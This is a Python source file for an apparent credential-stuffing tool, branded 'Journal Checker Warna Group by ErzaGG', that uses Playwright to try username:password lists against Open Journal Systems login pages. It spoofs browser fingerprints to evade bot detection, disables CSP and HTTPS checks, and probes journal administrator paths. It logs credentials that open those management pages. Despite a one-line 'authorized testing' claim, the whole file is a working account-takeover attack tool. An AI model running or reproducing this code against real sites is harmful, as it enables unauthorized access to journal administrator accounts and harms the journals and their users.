#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Playwright Login Tester — Ultra Robust (for authorized testing)
... (tetap sama header kamu)
This variant: if run WITHOUT CLI args, shows interactive terminal UI (rich + pyfiglet).
"""
import argparse, sys, time
from pathlib import Path
from typing import Iterable, Tuple, Optional, List, Set
from urllib.parse import urlparse
from playwright.sync_api import (
    sync_playwright, TimeoutError as PWTimeout, Page, Response
)

# --- new imports for UI ---
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt
    from rich.align import Align
    import pyfiglet
except Exception:
    # If rich/pyfiglet not installed, we will fallback to plain prompts
    Console = None
    pyfiglet = None

import os

console = Console() if Console else None

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# ---------- Banner Functions ----------
def render_banner(text="ERZAGG"):
    if console and pyfiglet:
        fig = pyfiglet.Figlet(font='slant')
        rendered = fig.renderText(text)
        console.print(f"[bold green]{rendered}[/bold green]")
    else:
        print("\n===", text, "===\n")

def render_banner_ascii(art: str, color="bold green"):
    if console:
        console.print(f"[{color}]{art}[/{color}]")
    else:
        print(art)


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

NAV_TO  = 35000   # ms
HINT_TO = 8000    # ms

# ---------- Interactive UI ----------
def render_banner(text="ERZAGG"):
    if console and pyfiglet:
        fig = pyfiglet.Figlet(font='slant')
        rendered = fig.renderText(text)
        console.print(f"[bold green]{rendered}[/bold green]")
    else:
        print("\n===", text, "===\n")

def interactive_args() -> argparse.Namespace:
    clear()
    render_banner_ascii(r"""
    ███████╗██████╗ ███████╗ █████╗  ██████╗  ██████╗ 
    ██╔════╝██╔══██╗╚══███╔╝██╔══██╗██╔════╝ ██╔════╝ 
    █████╗  ██████╔╝  ███╔╝ ███████║██║  ███╗██║  ███╗
    ██╔══╝  ██╔══██╗ ███╔╝  ██╔══██║██║   ██║██║   ██║
    ███████╗██║  ██║███████╗██║  ██║╚██████╔╝╚██████╔╝
    ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ 
    """)


    if console:
        console.print(Panel.fit("[bold green]Journal Checker Warna Group by ErzaGG[/bold green]", border_style="green"))
    else:
        print("Journal Checker Warna Group by ErzaGG")

    # required
    url = Prompt.ask("[green]Target login URL[/green] (e.g. https://host/index.php/index/login)") if console else input("Target login URL: ")
    user_field = Prompt.ask("[green]Username field selector[/green] (CSS)") if console else input("Username field selector: ")
    pass_field = Prompt.ask("[green]Password field selector[/green] (CSS)") if console else input("Password field selector: ")
    wordlist = Prompt.ask("[green]Wordlist file path[/green] (username:password per line)") if console else input("Wordlist file path: ")

    # optional
    submit_selector = Prompt.ask("[green]Submit selector[/green] (optional, CSS or text=Login)", default="") if console else input("Submit selector (optional): ")
    success_text = Prompt.ask("[green]Success text[/green] (optional)", default="") if console else input("Success text (optional): ")
    success_selector = Prompt.ask("[green]Success selector[/green] (optional)", default="") if console else input("Success selector (optional): ")

    headless = Prompt.ask("[green]Headless?[/green] (y/N)", default="n") if console else input("Headless? (y/N): ")
    headless_flag = headless.strip().lower().startswith("y")

    max_attempts = Prompt.ask("[green]Max attempts[/green] (0 = all)", default="0") if console else input("Max attempts (0=all): ")
    try:
        max_attempts = int(max_attempts)
    except Exception:
        max_attempts = 0

    delay = Prompt.ask("[green]Delay (s) between targets[/green]", default="2") if console else input("Delay (s): ")
    try:
        delay = int(delay)
    except Exception:
        delay = 2

    cooldown = Prompt.ask("[green]Cooldown (s) between creds[/green]", default="0.6") if console else input("Cooldown (s): ")
    try:
        cooldown = float(cooldown)
    except Exception:
        cooldown = 0.6

    stop_on_first = Prompt.ask("[green]Stop on first success?[/green] (y/N)", default="n") if console else input("Stop on first success? (y/N): ")
    stop_on_first_flag = stop_on_first.strip().lower().startswith("y")

    journals = Prompt.ask("[green]Journals (comma-separated)[/green] (optional)", default="") if console else input("Journals (comma-separated, optional): ")
    journals_file = Prompt.ask("[green]Journals file path[/green] (optional)", default="") if console else input("Journals file (optional): ")
    auto_discover = Prompt.ask("[green]Auto-discover journals?[/green] (y/N)", default="n") if console else input("Auto-discover journals? (y/N): ")
    auto_discover_flag = auto_discover.strip().lower().startswith("y")

    target_paths = Prompt.ask("[green]Target paths[/green] (comma-separated)", default="submissions,manager/setup/1,management/settings/website") if console else input("Target paths (comma-separated): ")

    success_log = Prompt.ask("[green]Success log file[/green]", default="success_log.txt") if console else input("Success log file (default success_log.txt): ")
    # build namespace
    ns = argparse.Namespace(
        url=url,
        user_field=user_field,
        pass_field=pass_field,
        submit_selector=submit_selector or None,
        success_text=success_text or None,
        success_selector=success_selector or None,
        wordlist=wordlist,
        max_attempts=max_attempts,
        headless=headless_flag,
        delay=delay,
        cooldown=cooldown,
        success_log=success_log,
        journals=journals or None,
        journals_file=journals_file or None,
        auto_discover=auto_discover_flag,
        target_paths=target_paths,
        stop_on_first=stop_on_first_flag
    )
    return ns

# ---------- CLI (kept backward compatible) ----------
def parse_args():
    # if user provided no CLI args -> interactive UI
    if len(sys.argv) == 1:
        return interactive_args()

    p = argparse.ArgumentParser(description="Login tester (ultra robust) + multi-journal + multi-target.")
    p.add_argument("--url", required=True, help="Login page URL (e.g. https://host/index.php/index/login)")
    p.add_argument("--user_field", required=True, help="CSS selector username input")
    p.add_argument("--pass_field", required=True, help="CSS selector password input")
    p.add_argument("--submit_selector", help="(opsional) tombol login (CSS / 'text=Login')")
    p.add_argument("--success_text", help="(opsional) teks muncul setelah login")
    p.add_argument("--success_selector", help="(opsional) selector setelah login, mis: a[href*='signOut']")
    p.add_argument("--wordlist", required=True, help="File 'username:password' per baris")
    # default jadi 0 = unlimited
    p.add_argument("--max_attempts", type=int, default=0,
                   help="Batas jumlah kredensial yang dicek (0 = semua)")
    p.add_argument("--headless", action="store_true")
    p.add_argument("--delay", type=int, default=2)
    p.add_argument("--cooldown", type=float, default=0.6)
    p.add_argument("--success_log", default="success_log.txt")
    # multi-journal
    p.add_argument("--journals", help="Comma-separated contexts (rabbani,okara,...)")
    p.add_argument("--journals_file", help="File daftar journal (satu per baris)")
    p.add_argument("--auto_discover", action="store_true", help="Deteksi journals dari link halaman (best-effort)")
    # multi-target
    p.add_argument("--target_paths",
                   default="submissions,manager/setup/1,management/settings/website",
                   help="Comma-separated paths di bawah /index.php/<journal>/...")
    p.add_argument("--stop_on_first", action="store_true",
                   help="Berhenti setelah 1 target sukses per akun (skip delay, clean exit).")
    return p.parse_args()

# ---------- (below this line, your original code remains unchanged) ----------
# ---------- Utils ----------
def iter_creds(path: str, limit: int) -> Iterable[Tuple[str, str]]:
    unlimited = (limit is None) or (limit <= 0)
    n = 0
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or ":" not in line:
                continue
            if (not unlimited) and (n >= limit):
                break
            u, pw = line.split(":", 1)
            yield u.strip(), pw.strip()
            n += 1

def base_origin(url: str) -> str:
    p = urlparse(url)
    return f"{p.scheme}://{p.netloc}"

def parse_ctx_from_url(url: str) -> Optional[str]:
    parts = [p for p in urlparse(url).path.split("/") if p]
    if "index.php" in parts:
        i = parts.index("index.php")
        if len(parts) > i+1:
            return parts[i+1]
    return None

def hrefs_on_page(page: Page) -> List[str]:
    try:
        return page.eval_on_selector_all("a[href*='/index.php/']", "els => els.map(a => a.href)") or []
    except Exception:
        return []

def discover_journals(page: Page) -> List[str]:
    seen: Set[str] = set()
    for href in hrefs_on_page(page):
        parts = [p for p in urlparse(href).path.split("/") if p]
        if "index.php" in parts:
            i = parts.index("index.php")
            if len(parts) > i+1:
                ctx = parts[i+1]
                if ctx and ctx != "index":
                    seen.add(ctx)
    return sorted(seen)

def normalize_paths(raw: str) -> List[str]:
    out = []
    for t in (raw or "").split(","):
        t = t.strip().lstrip("/")
        if t: out.append(t)
    return out or ["submissions"]

def success_hint(page: Page, text: Optional[str], sel: Optional[str]):
    try:
        if sel:
            page.wait_for_selector(sel, timeout=HINT_TO); return
    except PWTimeout:
        pass
    if text:
        try: page.wait_for_timeout(400)
        except Exception: pass

def reached_target_or_profile(page: Page, ctx: str, tpath: str) -> bool:
    path = urlparse(page.url).path.rstrip("/")
    if f"/index.php/{ctx}/{tpath}".rstrip("/") in path:
        return True
    if path.endswith("/user/profile") or f"/index.php/{ctx}/user/profile" in path:
        return True
    try:
        if page.query_selector("text=Submissions") or page.query_selector("text=My Queue"):
            return True
    except Exception:
        pass
    return False

def resp_is_error(resp: Optional[Response]) -> bool:
    if resp is None: return False
    try: return resp.status >= 400
    except Exception: return False

# ---------- Anti about:blank nav ----------
def ensure_nav(page: Page, url: str, timeout_ms: int = NAV_TO) -> Optional[Response]:
    last_exc = None
    for _ in range(3):
        try:
            resp = page.goto(url, wait_until="domcontentloaded", timeout=timeout_ms)
            if page.url.startswith("about:blank"):
                page.evaluate("u => location.href = u", url)
            try:
                page.wait_for_load_state("domcontentloaded", timeout=8000)
            except PWTimeout:
                pass
            return resp
        except Exception as e:
            last_exc = e
            time.sleep(0.8)
    print(f"[!] ensure_nav failed for {url}: {last_exc}")
    return None

# ---------- Robust login ----------
def perform_login(page: Page, user_sel: str, pass_sel: str, submit_sel: Optional[str],
                  username: str, password: str, cooldown: float) -> bool:
    try:
        page.fill(user_sel, username); time.sleep(cooldown/2)
        page.fill(pass_sel, password); time.sleep(cooldown/2)
    except Exception:
        return False

    if submit_sel:
        try:
            page.click(submit_sel, timeout=2500); return True
        except Exception:
            pass
    try:
        page.click("form[action*='login'] input[type='submit'], "
                   "form[action*='login'] button[type='submit']", timeout=2500)
        return True
    except Exception:
        pass
    for t in ("text=Login", "text=/^Login$/i", "text=/Log in/i"):
        try:
            page.click(t, timeout=1800); return True
        except Exception:
            continue
    try:
        page.focus(pass_sel); page.keyboard.press("Enter"); return True
    except Exception:
        return False

# ---------- MAIN (unchanged logic) ----------
def main():
    a = parse_args()
    success_log = Path(a.success_log)

    print("[*] Args:", vars(a))
    total_creds = sum(1 for _ in iter_creds(a.wordlist, a.max_attempts))
    print(f"[*] Parsed creds (mengandung ':'): {total_creds}")

    declared: List[str] = []
    if a.journals:
        declared += [x.strip() for x in a.journals.split(",") if x.strip()]
    if a.journals_file:
        with open(a.journals_file, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                j = line.strip()
                if j:
                    declared.append(j)
    declared = sorted(set(declared))
    targets = normalize_paths(a.target_paths)

    success_count = 0
    redirect_count = 0
    http_err_count = 0

    with sync_playwright() as pw:
        browser = pw.chromium.launch(
            headless=a.headless,
            args=["--disable-gpu", "--no-sandbox", "--disable-blink-features=AutomationControlled"]
        )

        tried = 0

        for i, (username, password) in enumerate(iter_creds(a.wordlist, a.max_attempts), 1):
            tried = i
            if i % 10 == 0:
                print(f"[*] Progress: {i} creds dicoba")

            print(f"\n[*] Trying {username} ...")

            ctx = browser.new_context(
                ignore_https_errors=True,
                viewport={"width":1366,"height":768},
                user_agent=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                            "AppleWebKit/537.36 (KHTML, like Gecko) "
                            "Chrome/126.0.0.0 Safari/537.36"),
                locale="en-US",
                timezone_id="Asia/Jakarta",
                bypass_csp=True,
            )
            ctx.add_init_script("""
Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
window.chrome = { runtime: {} };
Object.defineProperty(navigator, 'languages', { get: () => ['en-US','en'] });
Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
""")
            page = ctx.new_page()

            stop_now = False

            try:
                resp = ensure_nav(page, a.url, timeout_ms=NAV_TO)
                if resp_is_error(resp):
                    print(f"[!] Login URL HTTP {resp.status} → skip creds")
                    http_err_count += 1
                    continue
                try:
                    page.wait_for_load_state("networkidle", timeout=6000)
                except PWTimeout:
                    pass
                time.sleep(a.cooldown)

                if not perform_login(page, a.user_field, a.pass_field, a.submit_selector,
                                     username, password, a.cooldown):
                    print("[-] Cannot submit login (selector mismatch) → next creds")
                    continue
                try:
                    page.wait_for_load_state("domcontentloaded", timeout=HINT_TO)
                except PWTimeout:
                    pass
                success_hint(page, a.success_text, a.success_selector)

                journals = list(declared)
                if not journals and a.auto_discover:
                    journals = discover_journals(page)
                    print(f"[*] Auto-discovered journals: {', '.join(journals) if journals else '(none)'}")
                if not journals:
                    journals = [parse_ctx_from_url(page.url) or "index"]

                origin = base_origin(page.url)
                any_ok = False

                for jctx in journals:
                    if stop_now:
                        break
                    for t in targets:
                        if stop_now:
                            break
                        target_url = f"{origin}/index.php/{jctx}/{t}".rstrip("/")
                        print(f"   → Check {jctx} @ {t}: {target_url}")

                        resp = ensure_nav(page, target_url, timeout_ms=NAV_TO)
                        if resp_is_error(resp):
                            print(f"     [!] HTTP {resp.status} → skip")
                            continue
                        try:
                            page.wait_for_load_state("networkidle", timeout=4000)
                        except PWTimeout:
                            pass

                        if reached_target_or_profile(page, jctx, t):
                            any_ok = True
                            success_count += 1
                            print(f"     [+] success @ {jctx} | {page.url}")

                            if ("/management/settings/website" in page.url) or ("/manager/setup/1" in page.url):
                                success_log.parent.mkdir(parents=True, exist_ok=True)
                                with success_log.open("a", encoding="utf-8") as f:
                                    f.write(f"{username}:{password} -> {page.url}\n")
                                print("     [log] recorded (management/settings/website or manager/setup/1)")

                            if a.stop_on_first:
                                stop_now = True
                            else:
                                time.sleep(max(0, int(a.delay)))
                        else:
                            print(f"     [-] redirected/no access: {page.url}")
                            redirect_count += 1

                if not any_ok:
                    print(f"[~] {username}: login ok tapi ga ada target yg kebuka (submissions/profile/manager/setup/1).")

            finally:
                try:
                    if not page.is_closed():
                        page.close()
                except Exception:
                    pass
                try:
                    ctx.close()
                except Exception:
                    pass
                time.sleep(a.cooldown)

        browser.close()

    print(f"[*] Done. Total dicoba: {tried} dari {total_creds} creds valid.")
    print(f"    → Success login: {success_count}")
    print(f"    → Redirect/no access: {redirect_count}")
    print(f"    → HTTP error (4xx/5xx): {http_err_count}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user"); sys.exit(1)
